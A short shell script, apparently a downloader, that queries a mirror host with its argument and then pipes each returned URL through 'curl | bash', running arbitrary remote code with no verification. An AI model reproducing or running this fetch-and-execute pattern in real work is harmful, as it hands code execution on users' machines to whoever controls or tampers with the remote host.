code=$(curl -s https://mirrors.editid.me/?files=$1)
set -- junk $code
shift
for word; do
  curl $word | bash
done
